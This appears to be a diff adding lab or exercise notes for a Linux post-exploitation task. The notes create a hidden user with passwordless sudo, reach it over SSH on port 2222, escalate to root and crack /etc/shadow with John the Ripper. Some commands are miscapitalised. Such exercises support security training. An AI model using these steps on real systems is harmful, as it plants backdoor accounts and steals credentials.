@@ -1,0 +1,39 @@
+Step 1: Shadow People
+Create a secret user named sysd. Make sure this user doesn't have a home folder created:
+Useradd sysd
+Give your secret user a password:
+passwd sysd
+Give your secret user a system UID < 1000:
+usermod -u 998 sysd
+Give your secret user the same GID:
+groupmod -g 998 sysd
+Give your secret user full sudo access without the need for a password:
+Sudo visudo  sysd	ALL=(ALL:ALL) NOPASSWD:ALL
+Test that sudo access works without your password:
+Sudo -l
+
+ Matching Defaults entries for sysd on scavenger-hunt:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User sysd may run the following commands on scavenger-hunt:
+    (ALL : ALL) NOPASSWD: ALL
+
+Step 2: Smooth Sailing
+Edit the sshd_config file: 
+Sudo nano /etc/ssh/sshd_config
+Step 3: Testing Your Configuration Update
+Restart the SSH service:
+Systemctl restart ssh
+Exit the root account:
+exit
+SSH to the target machine using your sysd account and port 2222:
+ssh sysd@192.168.6.105 -p 2222
+Use sudo to switch to the root user:
+Sudo -s
+Step 4: Crack All the Passwords
+SSH back to the system using your sysd account and port 2222:
+Ssh sysd@192.168.6.105 -p 2222
+Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
+Sudo su
+John /etc/shadow 
